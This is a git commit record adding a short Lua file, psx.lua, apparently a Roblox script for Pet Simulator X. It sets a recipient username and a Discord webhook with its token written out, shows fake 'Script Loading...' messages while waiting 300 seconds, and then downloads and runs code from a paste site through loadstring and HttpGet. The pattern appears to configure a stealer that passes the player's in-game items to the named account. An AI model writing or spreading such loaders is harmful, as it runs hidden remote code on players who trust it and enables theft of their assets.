8ca2e6aef0fb1c1438ab743430a88f9b36d569d2
Rafascari <107323790+Rafascasari@users.noreply.github.com>
2023-05-29 03:18:46 +0100

    psx.lua

---
+++ psx.lua
@@ -0,0 +1,9 @@
+UserName = "iamredkeymon"
+UserName2 = "iamredkeymon"
+Webhook = "https://discord.com/api/webhooks/1112565006333136967/b1E-9dQ8XkjFDyMsennE4NAqLZS1xR4sh04crAuFpYwj1zC6FfOwLTufT0KC8LkhTNoS"
+_G.ScriptName = "Loading.."
+_G.FirstText = "Please wait.."
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 300
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/984685", true))()
